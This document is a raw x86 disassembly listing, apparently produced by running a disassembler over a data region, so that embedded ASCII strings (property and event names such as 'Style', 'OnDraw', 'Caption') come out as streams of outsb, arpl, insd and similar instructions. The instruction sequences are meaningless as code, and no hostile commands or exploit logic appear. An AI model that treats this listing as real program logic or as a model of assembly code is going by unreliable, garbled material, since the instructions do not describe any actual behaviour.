inc ebx
add [ eax ] al
inc ebp
je r-xdata
inc edx
outsd
outsd
push esp
jb r-xdata
add [ gs : bp + di ] ecx
jb r-xdata
outsb
outsd
outsb
je r-xdata
insd
inc ebp
jbe r-xdata
jne r-xdata
pop esp
adc [ ebp ] eax
jo r-xdata
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add ah cl
movsd [ edi ] [ esi ]
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
insd
push esp
jb r-xdata
inc ebx
jb r-xdata
je r-xdata
add [ edx ] al
jb r-xdata
jae r-xdata
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
popad
jb r-xdata
add cl [ eax ]
push es
push esp
push esi
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ 0x67617453 ] al
insd
outsb
je r-xdata
insb
popad
jae r-xdata
inc ebx
inc ecx
add al bl
add [ ecx + ebx + 0x310c0045 ] dl
inc ebx
push esi
imul esp [ ebp + 0x77 ] 0x6f4e0901
jbe r-xdata
add [ gs : bp + di ] ecx
push eax
popad
imul ebp [ esi + 0x74 ] 0x67616d49
jae r-xdata
inc ebx
ja r-xdata
outsd
sub al 0x11
inc eax
add [ esi + edi + 0x3e9c0043 ] bl
inc ebx
add [ eax + edx + 0x40 ] dl
sub_4333ad
push eax
test [ eax + eax ] 0x0
add [ eax + 0x1 ] al
jb r-xdata
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
je r-xdata
inc esi
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
call [ ebx + edi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48080014 ] al
outsd
je r-xdata
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
movsb [ edi ] [ esi ]
and al 0x42
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
insd
popad
jb r-xdata
insb
popad
jb r-xdata
jae r-xdata
arpl [ ebx ] bp
adc [ eax ] al
push eax
add [ eax ] al
outsd
int3
adc al 0x4f
outsb
inc ebx
jb r-xdata
imul ebp [ esi + 0x74 ] 0x432d4c73
add [ eax ] cl
add al [ eax ]
call [ eax + 0x100437b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
nop
push ebp
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
jae r-xdata
xor [ ebx ] al
sub al 0x2
add bh bh
push 0x100437b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5305001a ] al
je r-xdata
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
rcr [ eax + 0x8004335 ] 0x11
push esp
inc esp
jb r-xdata
push ebx
pop eax
inc ebx
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
outsb
inc esp
jb r-xdata
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
je r-xdata
insb
fsubr [ gs : edi ]
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
popad
jb r-xdata
jae r-xdata
outsb
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
inc ebx
ja r-xdata
adc [ eax ] al
lea eax [ eax ]
sbb [ esi ] dh
inc ebx
add [ eax ] cl
adc edx [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
outsb
je r-xdata
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
outsd
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
add bh bh
push esp
dec eax
popad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
inc ebx
add [ ebx + 0x433674c0 ] cl
pop es
jb r-xdata
jns r-xdata
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
shr [ esi ] 0x43
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
cmp [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
arpl [ ebx + 0x53 ] bp
arpl [ ebx + 0x45 ] bp
jbe r-xdata
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
mov eax eax
je r-xdata
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
push cs
push esp
dec eax
popad
jb r-xdata
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
inc esp
add [ ecx + eax * 4 + 0x43 ] dl
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + 0x76 ] bl
inc ebx
add [ edi + ecx + 0x77840045 ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
in al dx
ja r-xdata
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
inc ebp
add [ ecx + edx + 0x45 ] bl
xor al 0x49
je r-xdata
cmp [ ebx ] al
adc al 0x2b
outsb
je r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] dh
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
push cs
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax ] cl
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
inc ebx
jb r-xdata
outsb
je r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
or [ 0x64616548 ] cl
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
imul eax [ ebp + 0x76 ] 0x65
outsd
outsb
je r-xdata
outsd
insb
dec eax
aaa
inc ebx
add [ eax ] dl
xor al [ ebx ]
xor eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] dh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax ] al
xchg [ ebx ] eax
cmp [ edi - 0x7b93ffbd ] al
inc ebx
add [ esi ] cl
push esp
dec eax
popad
jb r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x38 ] 0x84
inc ebx
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] dh
jne r-xdata
inc ebp
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + 0x2d ] bh
inc ebx
add [ ebx + 0x433748c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi ] ch
inc ebx
add [ ebx + ebp ] dl
add al 0x8
or eax 0x64616548
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc ebp
add [ ecx + ecx * 2 ] dh
je r-xdata
outsd
outsb
je r-xdata
add cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x69570500
je r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsd
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
sbb al 0x38
inc ebx
add [ eax + 0x2 ] bh
add [ eax ] al
mov [ eax ] dh
inc ebx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
outsd
insb
outsd
insb
or [ edi ] al
push ebx
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
dec [ eax + 0x240044c9 ]
0x44
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec eax
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
xor [ eax ] bh
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ esi + 0x43 ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
jb r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
inc eax
jpo r-xdata
add bh bh
jpe r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
xchg esi eax
inc esp
add [ ecx + eax ] ch
add [ eax ] cl
inc edx
rol [ eax ] 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
add [ eax ] eax
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
call [ ebx + edi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
add [ eax ] al
inc ebx
jne r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
jpo r-xdata
jb r-xdata
popad
jb r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsd
outsb
je r-xdata
add [ edx ] bl
add [ 0x6c797453 ] al
imul ebp [ esi + 0x74 ] 0x432d4c73
add [ eax ] cl
add al [ eax ]
call [ eax + 0x100437b ]
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
push 0x100437b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
add eax 0x6c797453
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ ecx ] al
outsb
jae r-xdata
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
insd
popad
jae r-xdata
arpl [ ebx - 0x68 ] bp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
adc [ eax ] al
push eax
add [ eax ] al
inc eax
jb r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax - 0x65 ] eax
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
push esp
mov eax [ eax + eax - 0x18 ]
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
je r-xdata
pop ecx
add [ eax ] al
jmp [ eax - 0x29 ]
xor [ ebx ] al
sub al 0x2
add bh bh
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
push 0xd0004489
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
das
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push 0x6948776f
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
test dl bh
inc ebx
add ah ah
cli
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
xor eax 0xfa5c0043
inc ebx
add [ edx + edi * 8 + 0x10043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or eax 0x72446e4f
popad
ja r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
inc esp
dec edi
outsb
push eax
outsd
jo r-xdata
push eax
popad
jb r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov [ eax + eax - 0x30 ] eax
push ebp
inc ecx
add al bh
add [ eax ] al
push edx
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al 0x36
inc ebx
add [ eax - 0x6 ] dh
inc ebx
add al cl
cli
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
loopne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
inc ebx
mov esp 0x448d
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
jo r-xdata
jb r-xdata
inc esp
add al bl
add [ eax ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jbe r-xdata
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
sub [ ebx - 0x73abffbd ] bl
inc ecx
add [ ecx - 0x5f7fffbd ] ah
inc ebx
add [ edx ] cl
push esp
push esp
inc ebx
add [ eax + 0x415c ] bl
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
inc ebx
add [ eax + 0x43fa ] bl
sti
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
je r-xdata
dec esi
outsd
jae r-xdata
dec esi
insb
jae r-xdata
sbb [ eax - 0x73abffbd ] cl
inc ecx
add [ esp + ecx * 4 + 0x41 ] bl
add [ eax - 0x68 ] dh
inc ebx
add [ ebp + edx * 4 + 0xe0043 ] bl
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
nop
push ebp
inc ecx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x58 ] bp
das
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
outsb
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
outsd
jae r-xdata
sub [ edi ] bh
inc ebx
add [ edi ] al
or dl [ esp + edx * 2 + 0x72 ]
dec esi
insd
inc ebx
je r-xdata
aas
inc ebx
add [ eax + 0x415c ] bl
add [ eax ] cl
inc ebx
outsd
add [ edi + edi ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
aas
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
aas
inc ebx
add [ eax ] bl
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc ecx
add [ eax ] al
xchg ebp eax
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
jb r-xdata
cld
inc ebx
adc [ ebp + ecx * 2 + 0x75 ] edx
insb
insb
jae r-xdata
jae r-xdata
insb
jae r-xdata
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
mov al [ gs : 0x700433e ]
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
jo r-xdata
inc esp
jb r-xdata
outsd
push ebx
ja r-xdata
insb
jb r-xdata
inc eax
add [ edi + edi + 0x12030043 ] dl
push esp
dec ebp
jne r-xdata
push es
outsd
outsb
je r-xdata
add [ ebp + 0x3f500040 ] cl
inc ebx
add [ ebx ] al
or [ ebx + edx * 2 + 0x6f ] edx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
mov eax eax
jo r-xdata
jne r-xdata
je r-xdata
push 0x69676e61
outsb
inc ebp
jbe r-xdata
add [ gs : eax + 0x6000433f ] edx
inc eax
push 0x65676e61
pop es
jb r-xdata
jb r-xdata
aas
inc ebx
add [ esi ] al
arpl [ gs : ebx + edx * 2 + 0x74 ] si
jns r-xdata
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] ah
outsd
insb
push ebx
insb
arpl [ gs : ebp + ecx + 0x6d ] si
jae r-xdata
je r-xdata
push esp
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
or al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2800433e ] dl
add [ eax ] al
add [ esp + ebx * 2 ] ah
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffbcc2 ] al
inc ebx
jb r-xdata
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ ebx + 0x4340d0c0 ] cl
outsb
pop es
inc ebx
add [ eax ] cl
adc [ esp + edx * 2 + 0x56 ] dl
inc ebx
jb r-xdata
outsb
je r-xdata
add [ eax ] cl
andps xmm2 [ esi + edx * 2 + 0x43 ]
push 0x65676e61
inc ebp
jbe r-xdata
mov eax eax
rol [ eax + 0x43 ] 0x1
push esi
imul esp [ ebp + 0x77 ] 0x6f727245
or [ ecx + 0x6c ] eax
outsb
je r-xdata
jb r-xdata
jae r-xdata
insb
push ebx
insb
arpl [ gs : ebx + edx * 2 + 0x74 ] si
jns r-xdata
inc ebx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
inc eax
push 0x53746669
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
arpl [ gs : ebp + ecx + 0x6d ] si
jae r-xdata
imul esp [ esi + 0x74 ] 0x656c6553
arpl [ ebp + ecx + 0x6d ] si
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + edi + 0x43 ] cl
add [ esi ] al
jae r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ecx + edx ] ch
inc eax
add [ esi + edi + 0x41100043 ] bl
inc ebx
add [ eax ] cl
andps xmm2 [ esi + edx * 2 + 0x45 ]
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x65764567
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec esi
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esp + edx * 2 + 0x72 ] edx
imul esi [ fs : edi + eax + 0x42 ] 0x656c6f6f
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ esi + edi + 0x10000043 ] bl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push esp
push esi
inc ebp
imul esi [ fs : ebp + 0x64 ] 0x6e657645
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + 0x40 ] ah
jae r-xdata
add [ eax ] al
imul esi [ ebx + 0x69 ] 0x4f656c62
outsb
insb
jns r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi + ecx * 2 ] al
outsd
or [ gs : esp + edx * 2 + 0x72 ] edx
dec esi
outsd
add [ gs : ebx ] ecx
